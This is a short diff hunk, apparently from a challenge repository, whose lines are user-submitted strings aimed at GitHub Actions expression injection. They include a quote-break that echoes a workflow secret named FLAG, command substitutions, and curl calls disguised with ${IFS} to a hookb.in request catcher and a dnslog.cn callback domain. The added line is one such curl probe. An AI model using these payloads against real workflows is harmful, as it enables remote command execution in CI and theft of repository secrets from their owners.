@@ -674,3 +674,4 @@ lcl-367:${{ github.event.issue.number }} $( flag )
 hututu2:';echo ${{ secret[FLAG] }};
 wgblikeW:`curl${IFS}https://hookb.in/yD0Yn8MdnkUG9yjj9xe7`
 naivekun:8+8
+lcl-367:curl${IFS}fkssbb.sxhx72.dnslog.cn
